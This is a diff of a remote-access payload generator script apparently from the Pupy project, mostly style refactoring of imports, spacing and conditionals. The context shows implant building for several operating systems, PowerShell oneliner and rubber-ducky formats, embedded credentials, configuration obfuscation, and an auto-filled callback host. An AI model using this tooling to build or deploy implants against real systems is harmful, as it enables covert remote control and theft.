@@ -3,13 +3,30 @@
 # Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
 
-import argparse, sys, os.path, random, string
-import zipfile, tarfile, tempfile, shutil, subprocess, pkgutil
+import argparse
+import sys
+import os.path
+import random
+import string
+import zipfile
+import tarfile
+import tempfile
+import shutil
+import subprocess
+import pkgutil
 
 ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__)))
 
 if __name__ == '__main__':
     sys.path.insert(0, os.path.join(ROOT, 'pupy', 'library_patches'))
+
+import marshal
+import scriptlets
+import cPickle
+import base64
+import os
+import pylzma
+import struct
 
 from pupylib.utils.network import get_listener_ip, get_listener_port
 from pupylib.utils.term import colorize
@@ -25,14 +42,6 @@ from network.lib.base_launcher import LauncherError
 from scriptlets.scriptlets import ScriptletArgumentError
 from modules.lib.windows.powershell import obfuscatePowershellScript
 from pupylib.PupyCredentials import Credentials, EncryptionError
-
-import marshal
-import scriptlets
-import cPickle
-import base64
-import os
-import pylzma
-import struct
 
 logger = getLogger('gen')
 
@@ -82,14 +91,10 @@ def get_raw_conf(conf, obfuscate=False, verbose=False):
 
     credentials = Credentials(role='client')
 
-    if not "offline_script" in conf:
+    if "offline_script" not in conf:
         offline_script=""
     else:
         offline_script=conf["offline_script"]
-
-    obf_func=lambda x:x
-    if obfuscate:
-        obf_func=compress_encode_obfs
 
     launcher = launchers[conf['launcher']]()
     launcher.parse_args(conf['launcher_args'])
@@ -101,7 +106,7 @@ def get_raw_conf(conf, obfuscate=False, verbose=False):
     transports_list = []
 
     if transport:
-        transports_list = [ transport ]
+        transports_list = [transport]
         if transports[transport].credentials:
             for name in transports[transport].credentials:
                 required_credentials.add(name)
@@ -144,7 +149,7 @@ def get_raw_conf(conf, obfuscate=False, verbose=False):
     config = '\n'.join([
         'pupyimporter.pupy_add_package({})'.format(
             repr(cPickle.dumps({
-                'pupy_credentials.pye' :
+                'pupy_credentials.pye':
                 bytes(pupycompile(embedded_credentials, obfuscate=True))
             }))),
         dependencies.importer(set(
@@ -161,7 +166,7 @@ def get_raw_conf(conf, obfuscate=False, verbose=False):
         offline_script
     ])
 
-    return obf_func(config)
+    return compress_encode_obfs(config) if obfuscate else config
 
 def updateZip(zipname, filename, data):
     # generate a temp file
@@ -358,14 +363,14 @@ def generate_binary_from_template(config, osname, arch=None, shared=False, debug
     }
 
     SUFFIXES = {
-        'windows': ( 'exe', 'dll' ),
-        'linux':   ( 'lin', 'lin.so' ),
-        'solaris': ( 'sun', 'sun.so' ),
+        'windows': ('exe', 'dll'),
+        'linux':   ('lin', 'lin.so'),
+        'solaris': ('sun', 'sun.so'),
     }
 
     osname = osname.lower()
 
-    if not osname in CLIENTS.keys():
+    if osname not in CLIENTS.keys():
         raise ValueError('Unknown OS ({}), known = '.format(
             osname, ', '.join(CLIENTS.keys())))
 
@@ -489,8 +494,8 @@ PAYLOAD_FORMATS = [
     'client', 'py', 'pyinst', 'py_oneliner', 'ps1', 'ps1_oneliner', 'rubber_ducky'
 ]
 
-CLIENT_OS = [ 'android', 'windows', 'linux', 'solaris' ]
-CLIENT_ARCH = [ 'x86', 'x64' ]
+CLIENT_OS = ['android', 'windows', 'linux', 'solaris']
+CLIENT_ARCH = ['x86', 'x64']
 
 def get_parser(base_parser, config):
     parser = base_parser(description='Generate payloads for windows, linux, osx and android.')
@@ -557,7 +562,7 @@ def pupygen(args, config):
         try:
             launcher.parse_args(args.launcher_args)
         except LauncherError as e:
-            if str(e).strip().endswith("--host is required") and not "--host" in args.launcher_args:
+            if str(e).strip().endswith("--host is required") and "--host" not in args.launcher_args:
                 myip = get_listener_ip(external=args.prefer_external, config=config)
                 if not myip:
                     raise ValueError("--host parameter missing and couldn't find your local IP. "
@@ -572,7 +577,7 @@ def pupygen(args, config):
                     args.launcher_args += [
                         '--host', '{}:{}'.format(myip, myport), '-t', config.get('pupyd', 'transport')
                     ]
-            elif str(e).strip().endswith('--domain is required') and not '--domain' in args.launcher_args:
+            elif str(e).strip().endswith('--domain is required') and '--domain' not in args.launcher_args:
                 domain = config.get('pupyd', 'dnscnc').split(':')[0]
                 if not domain or '.' not in domain:
                     print(colorize('[!] DNSCNC disabled!', 'red'))
@@ -614,7 +619,7 @@ def pupygen(args, config):
         data, filename, makex = generate_binary_from_template(
             conf, args.os,
             arch=args.arch, shared=args.shared, debug=args.debug,
-            compressed=not ( args.uncompressed or args.packer )
+            compressed=not (args.uncompressed or args.packer)
         )
 
         if not outpath:
@@ -666,7 +671,7 @@ def pupygen(args, config):
 
             outfile = open(outpath, 'w+b')
 
-        if args.format=="pyinst" :
+        if args.format=="pyinst":
             linux_modules = getLinuxImportedModules()
         packed_payload = pack_py_payload(get_raw_conf(conf, verbose=True), args.debug)
 
@@ -693,12 +698,12 @@ def pupygen(args, config):
         if conf['launcher'] in ["connect", "auto_proxy"]:
             from pupylib.payloads.ps1_oneliner import serve_ps1_payload
             link_ip=conf["launcher_args"][conf["launcher_args"].index("--host")+1].split(":",1)[0]
-            if args.oneliner_no_ssl == False:
+            if not args.oneliner_no_ssl:
                 sslEnabled = True
             else:
                 sslEnabled = False
 
-            if args.no_use_proxy == False:
+            if not args.no_use_proxy:
                 useTargetProxy = True
             else:
                 useTargetProxy = False
